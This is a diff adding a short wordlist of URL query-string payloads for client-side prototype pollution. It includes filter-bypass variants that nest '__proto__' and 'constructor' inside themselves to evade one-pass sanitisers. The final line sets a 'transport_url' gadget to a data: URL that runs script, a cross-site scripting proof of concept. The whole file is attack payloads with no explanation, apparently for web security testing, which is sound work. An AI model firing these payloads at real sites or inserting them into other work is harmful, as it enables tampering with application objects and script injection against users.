@@ -1,0 +1,9 @@
+
+/?__proto__.foo=bar
+/?__proto__[foo]=bar
+/?constructor.prototype.foo=bar
+/?__pro__proto__to__[foo]=bar
+/?__pro__proto__to__.foo=bar
+/?constconstructorructor.[protoprototypetype][foo]=bar
+/?constconstructorructor.protoprototypetype.foo=bar
+/?__pro__proto__to__[transport_url]=data:,alert(1);
